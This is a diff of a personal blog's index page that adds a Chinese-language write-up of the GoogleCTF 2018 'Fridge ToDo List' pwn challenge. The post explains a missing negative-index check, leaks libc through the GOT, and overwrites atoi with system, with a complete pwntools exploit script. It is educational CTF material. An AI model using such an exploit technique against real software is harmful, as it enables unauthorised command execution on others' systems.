@@ -189,7 +189,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-count">51</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -290,6 +290,93 @@
     
     <div class="post-body" itemprop="articleBody">
           <h2 id="搭个博客防止我偷懒"><a href="#搭个博客防止我偷懒" class="headerlink" title="搭个博客防止我偷懒~"></a>搭个博客防止我偷懒~</h2>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/07/28/pwn-GoogleCTF-2018-ToDo/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mark0519">
+      <meta itemprop="description" content="大一在读，菜鸡pwn手~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark`s blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/07/28/pwn-GoogleCTF-2018-ToDo/" class="post-title-link" itemprop="url">pwn-GoogleCTF-2018-ToDo</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-07-28 19:08:56 / 修改时间：19:11:54" itemprop="dateCreated datePublished" datetime="2021-07-28T19:08:56+08:00">2021-07-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="GoogleCTF-2018-Fridge-ToDo-List"><a href="#GoogleCTF-2018-Fridge-ToDo-List" class="headerlink" title="GoogleCTF-2018 Fridge ToDo List"></a>GoogleCTF-2018 Fridge ToDo List</h1><p>开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。</p>
+<ol>
+<li>打印列表</li>
+<li>打印ToDo的任务</li>
+<li>存储ToDo任务</li>
+<li>删除ToDo任务</li>
+<li>远程管理员</li>
+<li>退出</li>
+</ol>
+<p>首先第一个选项，就仅仅是打印，没什么输入，放弃。</p>
+<p>第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。</p>
+<p>第五个查看源码就知道只是一个幌子。</p>
+<p>第六个没啥好说的，退出操作。</p>
+<p>看到第二个和第三个操作中都有同样的代码</p>
+<p><a target="_blank" rel="noopener" href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png"><img src="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png" alt="img"></a></p>
+<p>这里只检查了是否大于最大数量，并没有限制是否小于0,。所以我们可以越界读和写。</p>
+<p>通过IDA我们分析看到 todo从0x203140开始，间隔为0x30，那么往上面看看有什么可以读写的。</p>
+<p><a target="_blank" rel="noopener" href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png"><img src="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png" alt="img"></a></p>
+<p>不错，在.got.plt部分，我们可以读取到这三个函数的地址，泄露了函数地址，意味着我们可以得到libc的信息。</p>
+<p>这里我们看到atoi是每次我们输入编号都会调用的函数，atoi而且还在open的附近，那么我们可以把atoi覆盖成system执行我们的任意命令，造成命令执行。所以剩下的就简单了，执行写操作，通过之前泄露的libc得到system的地址，覆盖atoi的地址。代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line"><span class="comment"># r = remote(&quot;fridge-todo-list.ctfcompetition.com&quot;,1337)</span></span><br><span class="line">r = process(<span class="string">&#x27;./todo&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&quot;mark\n&quot;</span>)</span><br><span class="line">r.readuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;2\n&quot;</span>)</span><br><span class="line">r.readuntil(<span class="string">&quot;read?&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;-6\n&quot;</span>)</span><br><span class="line">res = r.readuntil(<span class="string">&quot;Hi mark,&quot;</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">&#x27;:&#x27;</span>,<span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="built_in">chr</span>(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">&quot;&lt;Q&quot;</span>,write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr<span class="number">-0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;3\n&quot;</span>)</span><br><span class="line">r.readuntil(<span class="string">&quot;entry?&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;-4\n&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;A&quot;</span>*<span class="number">8</span>+pack(<span class="string">&quot;&lt;Q&quot;</span>,system_addr)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
       
     </div>
 
@@ -899,83 +986,10 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/07/14/pwn-%E5%88%9D%E8%AF%86IO-FILE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="mark0519">
-      <meta itemprop="description" content="大一在读，菜鸡pwn手~">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Mark`s blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/14/pwn-%E5%88%9D%E8%AF%86IO-FILE/" class="post-title-link" itemprop="url">pwn-初识IO_FILE</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-07-14 11:34:28 / 修改时间：11:42:07" itemprop="dateCreated datePublished" datetime="2021-07-14T11:34:28+08:00">2021-07-14</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="初识IO-FILE"><a href="#初识IO-FILE" class="headerlink" title="初识IO_FILE"></a>初识IO_FILE</h1><h2 id="FILE-介绍"><a href="#FILE-介绍" class="headerlink" title="FILE 介绍"></a>FILE 介绍</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。常定义一个指向 FILE 结构的指针来接收这个返回值。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/07/14/pwn-%E5%88%9D%E8%AF%86IO-FILE/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
